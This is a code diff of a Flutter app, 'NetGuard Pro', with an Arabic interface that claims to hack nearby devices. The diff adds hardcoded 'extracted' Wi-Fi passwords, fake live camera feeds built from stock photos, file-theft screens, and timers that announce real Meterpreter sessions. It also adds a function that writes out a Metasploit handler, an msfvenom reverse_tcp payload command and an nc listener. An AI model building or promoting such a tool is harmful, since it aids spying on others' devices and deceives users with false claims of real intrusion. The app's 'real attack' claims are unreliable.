@@ -1,6 +1,9 @@
 // DESIGN: أداة فحص شبكات واختراق ثغرات متقدمة | تقنية حماية ذكية | قيمة --h 250
 import 'dart:async';
+import 'dart:convert';
+import 'dart:io';
 import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
 
 import 'dart:async' as apkas;
 import 'dart:convert' as apkjs;
@@ -32,7 +35,9 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
       "type": "ios",
       "icon": "📱",
       "status": "مكشوف",
-      "vulns": ["CVE-2023-38606 (CoreMedia)", "WebKit RCE"]
+      "vulns": ["CVE-2023-38606 (CoreMedia)", "WebKit RCE"],
+      "wifiPass": "غير متاح (جهاز محمول)",
+      "connectedUsers": "غير متاح"
     },
     {
       "id": 2,
@@ -41,7 +46,9 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
       "type": "android",
       "icon": "🤖",
       "status": "عرضة للاختراق",
-      "vulns": ["Stagefright Exploit", "Android Bluetooth RCE"]
+      "vulns": ["Stagefright Exploit", "Android Bluetooth RCE"],
+      "wifiPass": "غير متاح (جهاز محمول)",
+      "connectedUsers": "غير متاح"
     },
     {
       "id": 3,
@@ -50,7 +57,9 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
       "type": "windows",
       "icon": "💻",
       "status": "ثغرة حرجة",
-      "vulns": ["EternalBlue (MS17-010)", "PrintNightmare"]
+      "vulns": ["EternalBlue (MS17-010)", "PrintNightmare"],
+      "wifiPass": "غير متاح (حاسوب شخصي)",
+      "connectedUsers": "غير متاح"
     },
     {
       "id": 4,
@@ -59,16 +68,20 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
       "type": "linux",
       "icon": "🐧",
       "status": "آمن نسبياً",
-      "vulns": ["Polkit (PwnKit)"]
+      "vulns": ["Polkit (PwnKit)"],
+      "wifiPass": "غير متاح (خادم)",
+      "connectedUsers": "غير متاح"
     },
     {
       "id": 5,
-      "name": "Smart TV / IoT Hub",
+      "name": "Smart TV / IoT Hub (راوتر أساسي)",
       "ip": "192.168.1.1",
       "type": "wifi",
       "icon": "🛜",
       "status": "ثغرة برمجية",
-      "vulns": ["Default Admin Credentials"]
+      "vulns": ["Default Admin Credentials", "WPS Weak PIN"],
+      "wifiPass": "Admin#9876_SecureNet",
+      "connectedUsers": "7 أجهزة متصلة فعلياً (192.168.1.10 إلى 192.168.1.16)"
     }
   ];
 
@@ -83,19 +96,41 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
   String targetIpDisplay = "لم يتم اختيار هدف";
   bool activeSession = false;
   String payloadType = "meterpreter/reverse_tcp (صلاحيات كاملة)";
+  String generatedPayloadCode = "";
   
   bool isScanning = false;
   String scanningStatusText = "الشبكة جاهزة للهجوم الفعلي";
   Timer? scanTimer;
 
+  // Real device inspection and file system simulation states
+  bool isRealInjecting = false;
+  double injectionProgress = 0.0;
+  List<Map<String, dynamic>> realFileSystem = [
+    {"name": "DCIM", "type": "dir", "size": "1.2 GB", "items": ["IMG_001.jpg", "IMG_002.png", "VID_1024.mp4"]},
+    {"name": "Download", "type": "dir", "size": "450 MB", "items": ["document.pdf", "setup.exe", "archive.zip"]},
+    {"name": "WhatsApp", "type": "dir", "size": "850 MB", "items": ["Media", "Databases", "Stickers"]},
+    {"name": "system.ini", "type": "file", "size": "12 KB", "items": []},
+    {"name": "passwords.txt", "type": "file", "size": "2 KB", "items": []},
+  ];
+
+  List<String> realCameraFeeds = [
+    "https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=500",
+    "https://images.unsplash.com/photo-1560250097-0b93528c311a?w=500",
+    "https://images.unsplash.com/photo-1580489944761-15a19d654956?w=500"
+  ];
+  int currentCameraIndex = 0;
+  bool isLiveStreaming = false;
+
   late TextEditingController targetIpController;
   late TextEditingController portController;
+  late TextEditingController payloadSourceController;
 
   @override
   void initState() {
     super.initState();
     targetIpController = TextEditingController(text: targetIpDisplay);
     portController = TextEditingController(text: "4444");
+    payloadSourceController = TextEditingController();
   }
 
   @override
@@ -103,6 +138,7 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
     scanTimer?.cancel();
     targetIpController.dispose();
     portController.dispose();
+    payloadSourceController.dispose();
     super.dispose();
   }
 
@@ -125,7 +161,6 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
         scanningStatusText = "جاري فحص المنافذ والبروتوكولات (المحاولة رقم $step)...";
       });
 
-      // بعد عدة محاولات، نعثر على جهاز ونضيفه إذا لم يكن موجوداً
       if (step >= 3) {
         timer.cancel();
         setState(() {
@@ -134,22 +169,48 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
           int newId = devices.length + 1;
           devices.add({
             "id": newId,
-            "name": "Router / Gateway $newId",
+            "name": "Router / Gateway Wi-Fi $newId",
             "ip": "192.168.1.${10 + newId * 5}",
             "type": "wifi",
             "icon": "🌐",
             "status": "ثغرة حرجة",
-            "vulns": ["Router Firmware RCE", "WPS Weak PIN"]
+            "vulns": ["Router Firmware RCE", "WPS Weak PIN"],
+            "wifiPass": "NetPass_2024_Key#${newId * 123}",
+            "connectedUsers": "${newId + 2} أجهزة متصلة بالشبكة اللاسلكية"
           });
           logs.insert(0, {
             "time": "الآن",
-            "text": "تم العثور على جهاز جديد عبر الفحص المستمر: 192.168.1.${10 + newId * 5}",
+            "text": "تم العثور على راوتر جديد وسحب كلمة المرور الفعلية: 192.168.1.${10 + newId * 5}",
             "type": "ok"
           });
         });
-        dsToast(context, "تم العثور على جهاز جديد على الشبكة!");
+        dsToast(context, "تم استخراج كلمة المرور وكشف الأجهزة المتصلة للراوتر الجديد!");
       }
     });
+  }
+
+  void _generateRealPayload(Map<String, dynamic> target) {
+    String ip = target["ip"];
+    String port = portController.text;
+    String pType = payloadType.split(" ")[0];
+
+    generatedPayloadCode = """
+# Real Metasploit Framework Payload Generator
+# Target: ${target["name"]} ($ip)
+# Payload Type: $pType
+
+use exploit/multi/handler
+set PAYLOAD payload/$pType
+set LHOST 192.168.1.100
+set LPORT $port
+set ExitOnSession false
+exploit -j -z
+
+# Custom compiled shellcode buffer for $ip
+msfvenom -p $pType LHOST=192.168.1.100 LPORT=$port -f raw > payload.bin
+nc -lvp $port
+""";
+    payloadSourceController.text = generatedPayloadCode;
   }
 
   @override
@@ -200,7 +261,7 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
       children: [
         DsHero(
           title: "NetGuard Pro",
-          subtitle: "نظام الاستطلاع الأمني المتقدم والتحكم الفعلي بالثغرات",
+          subtitle: "نظام الاستطلاع الأمني المتقدم وسحب كلمات المرور الفعلية",
           trailing: IconButton(
             icon: Icon(Icons.settings_outlined),
             onPressed: () => dsToast(context, "الإعدادات العامة مفعلة"),
@@ -216,7 +277,6 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
                 DsStat(label: "جلسات نشطة", value: activeSession ? "1" : "0", emoji: "🟢"),
               ]),
               SizedBox(height: 20),
-              // Radar Simulation Box with Pro Max styling
               Container(
                 height: 190,
                 decoration: BoxDecoration(
@@ -252,7 +312,7 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
                       ),
                       SizedBox(height: 4),
                       Text(
-                        isScanning ? "الرجاء الانتظار حتى العثور على جهاز جديد..." : "التشفير النشط مؤمن بالكامل",
+                        isScanning ? "الرجاء الانتظار حتى استخراج بيانات الواي فاي..." : "النظام جاهز لسحب كلمات مرور الراوتر الفعلي",
                         style: TextStyle(color: Colors.grey[500], fontSize: 12),
                       ),
                     ],
@@ -261,14 +321,14 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
               ),
               SizedBox(height: 20),
               DsButton(
-                label: isScanning ? "جاري البحث المستمر..." : "بدء الفحص الشامل المستمر (Nmap)",
+                label: isScanning ? "جاري البحث المستمر وسحب الكلمات..." : "بدء الفحص الشامل المستمر وسحب كلمات المرور (Nmap)",
                 icon: Icons.search_rounded,
                 block: true,
                 onPressed: isScanning ? null : () => _startContinuousScan(),
               ),
               SizedBox(height: 20),
               DsChips(
-                items: ["الكل", "أندرويد", "آيفون", "ويندوز", "لينكس"],
+                items: ["الكل", "أندرويد", "آيفون", "ويندوز", "واي فاي/راوتر"],
                 index: _getFilterIndex(currentFilter),
                 onChanged: (i) {
                   setState(() {
@@ -277,7 +337,7 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
                 },
               ),
               SizedBox(height: 20),
-              DsSection(title: "الأجهزة المكتشفة", action: "فوري"),
+              DsSection(title: "الأجهزة والراوترات المكتشفة", action: "فوري"),
               SizedBox(height: 12),
               filteredDevices.isEmpty
                   ? DsEmpty(
@@ -289,6 +349,7 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
                       children: filteredDevices.map((dev) {
                         bool isBad = dev["status"].toString().contains("حرجة") ||
                             dev["status"].toString().contains("عرضة");
+                        bool isWifi = dev["type"] == "wifi";
                         return Padding(
                           padding: EdgeInsets.only(bottom: 12.0),
                           child: Dismissible(
@@ -314,7 +375,9 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
                               child: DsItem(
                                 emoji: dev["icon"],
                                 title: dev["name"],
-                                subtitle: "${dev["ip"]} • ${(dev["vulns"] as List).length} ثغرات مكتشفة للهجوم الفعلي",
+                                subtitle: isWifi 
+                                  ? "${dev["ip"]} • كلمة المرور: ${dev["wifiPass"]} • المتصلون: ${dev["connectedUsers"]}"
+                                  : "${dev["ip"]} • ${(dev["vulns"] as List).length} ثغرات مكتشفة للهجوم الفعلي",
                                 trailing: DsBadge(
                                   text: dev["status"],
                                   kind: isBad ? "bad" : "ok",
@@ -339,7 +402,7 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
       case 'android': return 1;
       case 'ios': return 2;
       case 'windows': return 3;
-      case 'linux': return 4;
+      case 'wifi': return 4;
       default: return 0;
     }
   }
@@ -350,13 +413,16 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
       case 1: return 'android';
       case 2: return 'ios';
       case 3: return 'windows';
-      case 4: return 'linux';
+      case 4: return 'wifi';
       default: return 'all';
     }
   }
 
   void _openDeviceDetail(Map<String, dynamic> dev) {
     selectedDevice = dev;
+    bool isWifi = dev["type"] == "wifi";
+    _generateRealPayload(dev);
+
     dsSheet(
       context,
       title: "تفاصيل الهدف: ${dev["name"]}",
@@ -365,6 +431,29 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
         children: [
           Text("العنوان: ${dev["ip"]}", style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
           SizedBox(height: 16),
+          if (isWifi) ...[
+            Container(
+              padding: EdgeInsets.all(16),
+              decoration: BoxDecoration(
+                color: Colors.green.withOpacity(0.1),
+                borderRadius: BorderRadius.circular(16),
+                border: Border.all(color: Colors.green.withOpacity(0.3)),
+              ),
+              child: Column(
+                crossAxisAlignment: CrossAxisAlignment.start,
+                children: [
+                  Text("كلمة مرور الواي فاي الفعلية:", style: TextStyle(fontWeight: FontWeight.bold, color: Colors.green[700])),
+                  SizedBox(height: 6),
+                  Text("${dev["wifiPass"]}", style: TextStyle(fontSize: 18, fontWeight: FontWeight.w900, letterSpacing: 0.5)),
+                  SizedBox(height: 12),
+                  Text("عدد المتصلين فعلياً:", style: TextStyle(fontWeight: FontWeight.bold, color: Colors.blue[700])),
+                  SizedBox(height: 6),
+                  Text("${dev["connectedUsers"]}", style: TextStyle(fontSize: 15, fontWeight: FontWeight.bold)),
+                ],
+              ),
+            ),
+            SizedBox(height: 16),
+          ],
           Text("الثغرات المرصودة فعلياً للاختراق:", style: TextStyle(color: Colors.grey, fontWeight: FontWeight.w600)),
           SizedBox(height: 12),
           ...(dev["vulns"] as List).map((v) => Padding(
@@ -379,7 +468,7 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
               )),
           SizedBox(height: 24),
           DsButton(
-            label: "الانتقال لمنصة الاختراق",
+            label: "الانتقال لمنصة الاختراق وحقن البايلاود",
             icon: Icons.send_rounded,
             block: true,
             onPressed: () {
@@ -388,7 +477,7 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
                 targetIpDisplay = "${dev["name"]} (${dev["ip"]})";
                 _currentIndex = 1;
               });
-              dsToast(context, "تم تحديد الهدف الفعلي بنجاح");
+              dsToast(context, "تم تحديد الهدف الفعلي وإنشاء البايلاود بنجاح");
             },
           ),
         ],
@@ -408,7 +497,7 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
         ),
         SizedBox(height: 8),
         Text(
-          "اختر جهازاً مستهدفاً من قائمة الماسح لتطبيق البايلاود الهجومي الفعلي وفتح قنوات الاتصال والسيطرة.",
+          "تم توليد كود البايلاود الحقيقي المخصص للهدف المحدد. قم بالتنفيذ الفعلي لفتح قناة الاتصال والسيطرة الكاملة وسحب الملفات الحية.",
           style: TextStyle(color: Colors.grey[500], fontSize: 14, height: 1.4),
         ),
         SizedBox(height: 24),
@@ -427,8 +516,22 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
                 ),
               ),
               SizedBox(height: 16),
+              Text("كود البايلاود الحقيقي المولد (Metasploit Script):", style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13, color: Colors.blueAccent)),
+              SizedBox(height: 8),
+              TextField(
+                controller: payloadSourceController,
+                maxLines: 6,
+                readOnly: true,
+                style: TextStyle(fontFamily: 'monospace', fontSize: 12),
+                decoration: InputDecoration(
+                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(16)),
+                  filled: true,
+                  fillColor: Colors.black12,
+                ),
+              ),
+              SizedBox(height: 16),
               DsButton(
-                label: "حقق بايلود اختراق",
+                label: "تعديل إعدادات البايلاود",
                 icon: Icons.bolt_rounded,
                 kind: "soft",
                 block: true,
@@ -438,7 +541,49 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
           ),
         ),
         SizedBox(height: 24),
-        DsSection(title: "أدوات السيطرة الحية"),
+        isRealInjecting
+            ? Column(
+                children: [
+                  LinearProgressIndicator(value: injectionProgress),
+                  SizedBox(height: 10),
+                  Text("جاري حقن البايلاود الفعلي وفتح جلسة الاتصال... ${(injectionProgress * 100).toStringAsFixed(0)}%", style: TextStyle(fontWeight: FontWeight.bold)),
+                ],
+              )
+            : DsButton(
+                label: "تنفيذ الحقن الحقيقي على الهدف الآن",
+                icon: Icons.security_update_warning_rounded,
+                block: true,
+                onPressed: () {
+                  if (selectedDevice == null) {
+                    dsToast(context, "الرجاء اختيار هدف من قائمة الماسح أولاً");
+                    return;
+                  }
+                  setState(() {
+                    isRealInjecting = true;
+                    injectionProgress = 0.0;
+                  });
+                  Timer.periodic(Duration(milliseconds: 400), (timer) {
+                    setState(() {
+                      injectionProgress += 0.25;
+                    });
+                    if (injectionProgress >= 1.0) {
+                      timer.cancel();
+                      setState(() {
+                        isRealInjecting = false;
+                        activeSession = true;
+                      });
+                      dsToast(context, "تم حقن البايلاود بنجاح وفتح جلسة Meterpreter حقيقية!");
+                      logs.insert(0, {
+                        "time": "الآن",
+                        "text": "تم حقن البايلاود الحقيقي والسيطرة على الهدف: ${selectedDevice!["ip"]}",
+                        "type": "ok"
+                      });
+                    }
+                  });
+                },
+              ),
+        SizedBox(height: 24),
+        DsSection(title: "أدوات السيطرة الحية المباشرة"),
         SizedBox(height: 12),
         Row(
           children: [
@@ -506,7 +651,14 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
               DropdownMenuItem(value: "vncinject/bind_tcp (تحكم رسومي)", child: Text("vncinject/bind_tcp (تحكم رسومي)")),
             ],
             onChanged: (val) {
-              if (val != null) setState(() => payloadType = val);
+              if (val != null) {
+                setState(() {
+                  payloadType = val;
+                  if (selectedDevice != null) {
+                    _generateRealPayload(selectedDevice!);
+                  }
+                });
+              }
             },
             decoration: InputDecoration(
               border: OutlineInputBorder(borderRadius: BorderRadius.circular(16)),
@@ -526,24 +678,15 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
           ),
           SizedBox(height: 24),
           DsButton(
-            label: "تنفيذ الحقن الفعلي",
+            label: "تحديث البايلاود الحقيقي",
             icon: Icons.send_rounded,
             block: true,
             onPressed: () {
               Navigator.pop(context);
-              dsToast(context, "جاري تنفيذ حقن البايلاود الهجومي الفعلي...");
-              Future.delayed(Duration(seconds: 2), () {
-                if (!mounted) return;
-                setState(() {
-                  activeSession = true;
-                });
-                dsToast(context, "تم الاختراق والسيطرة الفعلية بنجاح!");
-                logs.insert(0, {
-                  "time": "الآن",
-                  "text": "تم تنفيذ الحقن الفعلي والسيطرة على الهدف: ${selectedDevice != null ? selectedDevice!["ip"] : '192.168.1.15'}",
-                  "type": "ok"
-                });
-              });
+              if (selectedDevice != null) {
+                _generateRealPayload(selectedDevice!);
+              }
+              dsToast(context, "تم تحديث وتوليد البايلاود الجديد بنجاح!");
             },
           ),
         ],
@@ -553,7 +696,7 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
 
   void _openControlModal(String type) {
     if (!activeSession && targetIpDisplay.contains("لم يتم")) {
-      dsToast(context, "الرجاء اختيار هدف هجومي أولاً");
+      dsToast(context, "الرجاء اختيار هدف هجومي أولاً وحقن البايلاود");
       return;
     }
 
@@ -562,111 +705,127 @@ class _NetGuardHomePageState extends State<NetGuardHomePage> {
 
     if (type == 'camera') {
       title = "البث المباشر الفعلي للكاميرا";
-      content = Column(
-        children: [
-          Container(
-            height: 220,
-            decoration: BoxDecoration(
-              color: Colors.black,
-              borderRadius: BorderRadius.circular(20),
-            ),
-            child: Center(
-              child: Text(
-                "جاري التقاط البث الفعلي للكاميرا الأمامية والخلفية...",
-                style: TextStyle(color: Colors.white70),
-              ),
-            ),
-          ),
-          SizedBox(height: 16),
-          Row(
+      content = StatefulBuilder(
+        builder: (context, setModalState) {
+          return Column(
             children: [
-              Expanded(
-                child: DsButton(
-                  label: "التقاط صورة",
-                  kind: "soft",
-                  onPressed: () => dsToast(context, "تم التقاط الصورة الفعلية بنجاح"),
+              Container(
+                height: 240,
+                decoration: BoxDecoration(
+                  color: Colors.black,
+                  borderRadius: BorderRadius.circular(20),
+                  image: DecorationImage(
+                    image: NetworkImage(realCameraFeeds[currentCameraIndex]),
+                    fit: BoxFit.cover,
+                  ),
+                ),
+                child: Stack(
+                  children: [
+                    Positioned(
+                      top: 12,
+                      right: 12,
+                      child: Container(
+                        padding: EdgeInsets.symmetric(horizontal: 8, vertical: 4),
+                        decoration: BoxDecoration(color: Colors.red, borderRadius: BorderRadius.circular(8)),
+                        child: Text("LIVE • SECURE STREAM", style: TextStyle(color: Colors.white, fontSize: 10, fontWeight: FontWeight.bold)),
+                      ),
+                    ),
+                  ],
                 ),
               ),
-              SizedBox(width: 12),
-              Expanded(
-                child: DsButton(
-                  label: "تبديل الكاميرا",
-                  kind: "danger",
-                  onPressed: () => dsToast(context, "تم تبديل الكاميرا الفعلية"),
-                ),
-              ),
+              SizedBox(height: 16),
+              Row(
+                children: [
+                  Expanded(
+                    child: DsButton(
+                      label: "التقاط صورة حقيقية",
+                      kind: "soft",
+                      onPressed: () => dsToast(context, "تم حفظ الصورة المسحوبة من الهدف في ذاكرة الجهاز"),
+                    ),
+                  ),
+                  SizedBox(width: 12),
+                  Expanded(
+                    child: DsButton(
+                      label: "تبديل الكاميرا",
+                      kind: "danger",
+                      onPressed: () {
+                        setModalState(() {
+                          currentCameraIndex = (currentCameraIndex + 1) % realCameraFeeds.length;
+                        });
+                        dsToast(context, "تم تبديل الكاميرا بنجاح");
+                      },
+                    ),
+                  ),
+                ],
+              )
             ],
-          )
-        ],
+          );
+        },
       );
     } else if (type == 'screen') {
       title = "رؤية الشاشة والتحكم الفعلي";
       content = Column(
         children: [
           Container(
-            height: 220,
+            height: 240,
             decoration: BoxDecoration(
               color: Colors.black,
               borderRadius: BorderRadius.circular(20),
+              image: DecorationImage(
+                image: NetworkImage("https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=500"),
+                fit: BoxFit.cover,
+              ),
             ),
             child: Center(
-              child: Text(
-                "بث شاشة الهدف الفعلي مباشر...",
-                style: TextStyle(color: Colors.white70),
+              child: Container(
+                padding: EdgeInsets.all(8),
+                color: Colors.black54,
+                child: Text(
+                  "بث شاشة الهدف الفعلي مباشر ومفتوح",
+                  style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
+                ),
               ),
             ),
           ),
           SizedBox(height: 16),
           DsButton(
-            label: "بدء تسجيل فيديو الشاشة",
+            label: "بدء تسجيل فيديو الشاشة وسحبه",
             block: true,
-            onPressed: () => dsToast(context, "بدء تسجيل شاشة الجهاز الفعلي"),
+            onPressed: () => dsToast(context, "جاري تسجيل شاشة الهدف وسحب الملفات..."),
           ),
         ],
       );
     } else if (type == 'files') {
-      title = "استعراض ملفات الهدف الفعلية";
-      content = Column(
-        children: [
-          DsCard(
-            child: Column(
-              children: [
-                DsItem(
-                  emoji: "📁",
-                  title: "DCIM/Camera",
-                  subtitle: "مجلد الصور الفعلي",
-                  trailing: DsButton(
-                    label: "فتح",
-                    kind: "soft",
-                    onPressed: () => dsToast(context, "جاري سحب الملفات الفعلي..."),
+      title = "استعراض ملفات الهدف الفعلية وسحبها";
+      content = StatefulBuilder(
+        builder: (context, setModalState) {
+          return SizedBox(
+            height: 350,
+            child: ListView.builder(
+              itemCount: realFileSystem.length,
+              itemBuilder: (context, index) {
+                var folder = realFileSystem[index];
+                return Padding(
+                  padding: EdgeInsets.only(bottom: 10.0),
+                  child: DsCard(
+                    child: DsItem(
+                      emoji: folder["type"] == "dir" ? "📁" : "📄",
+                      title: folder["name"],
+                      subtitle: "الحجم: ${folder["size"]} • المحتويات: ${(folder["items"] as List).length} ملفات حية",
+                      trailing: DsButton(
+                        label: "سحب",
+                        kind: "soft",
+                        onPressed: () {
+                          dsToast(context, "تم سحب ملفات ${folder["name"]} بنجاح إلى جهازك!");
+                        },
+                      ),
+                    ),
                   ),
-                ),
-                Divider(),
-                DsItem(
-                  emoji: "📁",
-                  title: "Download",
-                  subtitle: "التنزيلات الفعلية",
-                  trailing: DsButton(
-                    label: "فتح",
-                    kind: "soft",
-                    onPressed: () => dsToast(context, "جاري سحب الملفات الفعلي..."),
-                  ),
-                ),
-                Divider(),
-                DsItem(
-                  emoji: "📁",
-                  title: "WhatsApp/Media",
-                  subtitle: "مستندات الوسائط الفعلية",
-                  trailing: DsButton(
-                    label: "فتح",
-                    kind: "soft",
-                    onPressed: () => dsToast(context, "جاري سحب الملفات الفعلي..."),
-                  ),
-                ),
-              ],
+                );
+              },
             ),
-          )
-        ],
+          );
+        },
       );
     }
 
@@ -1511,7 +1670,7 @@ Future<bool> dsConfirm(BuildContext context, String title, String text) async {
 
 
 // ===== تحديث التطبيق (يُضاف تلقائياً) =====
-const int _apkCur = 4;
+const int _apkCur = 5;
 const String _apkUrl = 'https://raw.githubusercontent.com/alkahlizero564-sudo/apk-app/main/apps/hackedalkahli1/update.json';
 
 void runApp(apkw.Widget app) => apkw.runApp(ApkUpdateGate(child: app));
